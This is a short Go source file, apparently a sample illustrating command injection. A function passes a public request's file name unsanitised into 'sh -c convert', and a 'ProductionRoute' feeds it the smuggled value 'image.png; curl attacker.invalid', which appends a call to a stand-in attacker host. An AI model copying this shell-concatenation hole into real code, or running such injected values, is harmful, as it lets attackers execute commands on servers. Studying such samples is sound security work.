package convert

import "os/exec"

type Request struct{ Name string }

func HandlePublicRequest(request Request) *exec.Cmd {
	return exec.Command("sh", "-c", "convert "+request.Name)
}

func ProductionRoute() *exec.Cmd {
	return HandlePublicRequest(Request{Name: "image.png; curl attacker.invalid"})
}
